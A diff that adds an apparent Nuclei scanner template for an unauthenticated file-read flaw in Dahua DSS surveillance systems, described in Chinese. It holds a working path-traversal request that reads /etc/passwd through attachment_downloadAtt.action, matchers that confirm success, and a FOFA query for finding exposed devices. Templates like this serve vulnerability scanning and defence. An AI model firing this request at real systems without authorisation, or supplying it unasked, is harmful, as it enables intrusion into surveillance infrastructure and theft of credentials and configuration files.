@@ -1,0 +1,38 @@
+id: dahuaDSS-attachment_downloadAtt_action-File-reading-XVE-2024-34436
+
+info:
+  name: "大华DSS数字监控系统 attachment_downloadAtt.action 未授权文件读取漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="dahua-DSS"
+    大华DSS数字监控系统中 attachment_downloadByUrlAtt.action 接口存在文件访问控制缺陷，攻击者可利用此缺陷在未认证状态下访问敏感系统文件（包括但不限于数据库配置文件、系统配置文件等），从而获取关键系统凭证及配置信息，造成严重的安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/InlSDzXtGsx90OLULJP9GA?token=523748735&lang=zh_CN
+  tags: 大华DSS数字监控系统
+
+
+
+http:
+- raw:
+  - |
+    GET /portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'root:'
+    - '/bin/bash'
+    condition: and
+  - type: status
+    status:
+    - 200
+
